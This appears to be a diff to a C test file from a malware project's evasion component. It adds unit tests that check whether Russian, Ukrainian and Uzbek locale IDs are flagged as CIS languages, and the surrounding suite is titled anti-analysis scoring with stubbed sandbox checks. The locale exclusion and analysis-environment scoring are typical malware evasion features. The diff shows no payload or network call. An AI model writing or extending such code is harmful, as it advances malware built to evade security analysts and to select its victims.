@@ -17,6 +17,9 @@
 #include "anti_analysis.h"
 #include "config.h"
 
+/* Use real is_cis_language from detection.c */
+extern int is_cis_language(uint16_t lang_id);
+
 /* ── Stub implementations for platform-specific functions ────── */
 
 static uint64_t stub_ram = 8ULL * 1024 * 1024 * 1024; /* 8 GB */
@@ -410,6 +413,42 @@ static void test_analysis_result_struct(void) {
     printf("  PASS: test_analysis_result_struct\n");
 }
 
+
+/* ── is_cis_language tests (from detection.c) ────────────── */
+
+static void test_cis_russian(void) {
+    /* Russian primary language ID = 0x19 */
+    assert(is_cis_language(0x0419) == 1); /* Russian (Russia) */
+    assert(is_cis_language(0x0819) == 1); /* Russian (other) */
+    printf("  PASS: test_cis_russian\n");
+}
+
+static void test_cis_ukrainian(void) {
+    assert(is_cis_language(0x0422) == 1); /* Ukrainian */
+    printf("  PASS: test_cis_ukrainian\n");
+}
+
+static void test_cis_english_not_cis(void) {
+    assert(is_cis_language(0x0409) == 0); /* English (US) */
+    assert(is_cis_language(0x0809) == 0); /* English (UK) */
+    printf("  PASS: test_cis_english_not_cis\n");
+}
+
+static void test_cis_german_not_cis(void) {
+    assert(is_cis_language(0x0407) == 0); /* German */
+    printf("  PASS: test_cis_german_not_cis\n");
+}
+
+static void test_cis_uzbek(void) {
+    assert(is_cis_language(0x042F) == 1); /* Uzbek (primary 0x2F) */
+    printf("  PASS: test_cis_uzbek\n");
+}
+
+static void test_cis_zero(void) {
+    assert(is_cis_language(0) == 0);
+    printf("  PASS: test_cis_zero\n");
+}
+
 int main(void) {
     printf("=== test_evasion: anti-analysis scoring ===\n");
 
@@ -440,6 +479,13 @@ int main(void) {
     test_max_score_all_checks();
     test_analysis_flags_struct();
     test_analysis_result_struct();
+
+    test_cis_russian();
+    test_cis_ukrainian();
+    test_cis_english_not_cis();
+    test_cis_german_not_cis();
+    test_cis_uzbek();
+    test_cis_zero();
 
     printf("=== test_evasion: ALL PASSED ===\n");
     return 0;
